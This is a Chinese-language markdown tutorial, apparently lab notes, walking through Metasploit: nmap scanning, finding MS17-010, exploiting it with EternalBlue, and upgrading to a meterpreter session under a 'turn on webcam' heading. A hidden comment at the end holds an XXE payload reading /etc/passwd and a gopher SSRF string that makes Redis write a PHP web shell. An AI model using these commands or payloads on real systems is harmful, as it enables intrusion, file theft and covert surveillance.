<!---
```diff
+ green color text
- red color text
```
-->

+ 進入metasploit
  - msfdb init : 初始化數據庫 (若沒執行這行，連接數據庫會有問題)
  - msfconsole : 啟動
  - workspace : 當前工作區
  - db_status :　是否成功連接到數據庫
  - workspace -a meow :　另創一個數據庫meow
  - ? : 通過?查看當前工作區可以使用的指令
  
![image](https://user-images.githubusercontent.com/96654161/170452994-0fe2ddb7-384f-4459-ac3f-a124c83b3922.png)

+ 信息蒐集 -> 內網主機發現
  - db_nmap : nmap掃描
    - -PA : TCP ACK PING掃描
    - -PS : TCP SYN PING掃描
    - -PR : ARP掃描nmap對目標進行arp ping掃描的過程，尤其在內網的情況下。因為防火牆不會禁止ARP請求
    - hosts : 列出當前工作區所有主機
    
  - 1.ifconfig 查看當前哪些主機存活
  - 2.db_nmap -PR IP/24
  
![image](https://user-images.githubusercontent.com/96654161/170454550-ace64ee5-bc5b-441c-9a1f-336568b2abd2.png)

     -T[0-5] : 莫認為T3、T4表示最大TCP掃描延遲為10ms
     sS : TCP SYN掃描
     sA : TCP ACK掃描
     sY : TCP SYN掃描
     A : 打開操作系統探測和版本探測
 
  - db_nmap -sS -A -T4 192.168.xx.x
![image](https://user-images.githubusercontent.com/96654161/170462660-3b86cb80-6cd1-4b8b-845f-fccd63797fb7.png)

  - db_nmap --script=vuln IP
    - script=vuln : 檢查是否具有常見漏洞
![image](https://user-images.githubusercontent.com/96654161/170464782-26acc2ae-f016-4e50-a663-93dcd80ac177.png)
>這裡找到ms17_010

+ auxiliary 模塊
  - search ms17_010
 
![image](https://user-images.githubusercontent.com/96654161/170476395-67b42a48-a313-4595-aaac-7a59570dcdbd.png)
>這裡看到第三項，描述的是for win8，但在前面掃描OS是win7所以不適用

  - info auxiliary/scanner/smb/smb_ms17_010

![image](https://user-images.githubusercontent.com/96654161/170468777-31bd8a4c-e86d-4584-a37c-e2f938d267c9.png)

  - use auxiliary/scanner/smb/smb_ms17_010 #要使用某模塊都用 use modules
  - options 查看設置 ->required 如果是yes就必須要配置
![image](https://user-images.githubusercontent.com/96654161/170471161-04096171-0096-4c96-92e6-fc5cc911859c.png)

  - set RHOSTS 掃描主機IP
  - run / exploit 執行
![image](https://user-images.githubusercontent.com/96654161/170472589-93bc1135-7785-47a5-b28e-c4e3d361b9fe.png)

+ use exploit/windows/smb/ms17_010_eternalblue
+ options
+ set rhosts ip
+ show targets
+ run

![image](https://user-images.githubusercontent.com/96654161/170538076-6daa23d6-324e-4a85-af13-0ba5bc71738e.png)
![image](https://user-images.githubusercontent.com/96654161/170542273-10a4a4fb-3675-4f8a-a251-9986197e8170.png)
![image](https://user-images.githubusercontent.com/96654161/170542834-39ae3629-4501-4b9b-8d89-03b2771d5806.png)

>sessions[-l] : 列出當前所有session
>sessions[-i]id:進入某個session
>background : 把當前shell放到後台去執行，然後返回到MSF中

![image](https://user-images.githubusercontent.com/96654161/170543869-79dae501-522f-4151-80f5-8cb957994134.png)

```diff
show exploits -> 查看所有可用的滲透攻擊程序代碼 
show auxiliary -> 查看所有可用的輔助攻擊工具
[show]options/advanced -> 查看該模塊可用選項
show payloads -> 查看該模塊適用的所有載荷代碼
show targets -> 查看該模塊適用的攻擊目標類型
search -> 根據關鍵字搜索某模塊
info -> 顯示某模塊的詳細信息
use -> 使用某滲透攻擊模塊
back -> 回退
set/unset -> 設置/禁用模塊中的某個參數
setg/unsetg -> 設置/禁用適用於所有模塊的全局參數
save -> 將當前設置值保存下來，以便下次啟動MSF終端時仍可使用
```
### 開啟攝像頭

+ sessions -u id : 將某個session轉為meterpreter
+ 由shell轉meterpreter 

![image](https://user-images.githubusercontent.com/96654161/170551298-5e7490c3-eedf-4547-8adb-2a0e2f713a98.png)

+ sessions -i id
+ ? (查看當前可以使用的命令)
![image](https://user-images.githubusercontent.com/96654161/170551366-390beaf3-9fec-4584-bd8d-3e76906cdc2b.png)
![image](https://user-images.githubusercontent.com/96654161/170551422-770a6fbc-db10-471f-940b-972ef34aadc1.png)
![image](https://user-images.githubusercontent.com/96654161/170551811-67a65e65-2925-4c1d-b39e-57b99f996055.png)
![image](https://user-images.githubusercontent.com/96654161/170551958-4c27c0c4-ab7a-4d03-a48f-c869a391b668.png)




<!---
XXE 
<!DOCTYPE kaibro[
       <!ENTITY xxe SYSTEM "file:///etc/passwd">
     ]>
     <root>&xxe;</root>
     
 SSRF gopher     
 gopher://localhost:6379/_FLUSHALL%0d%0aSET%20kaibro%20"<%3F=system($_GET[1]);%3F>"%0d%0aCONFIG%20SET%20DIR%20/www/%0d%0aCONFIG%20SET%20DBFILENAME%20ggininder123.php%0d%0aSAVE%0d%0aQUIT

-->
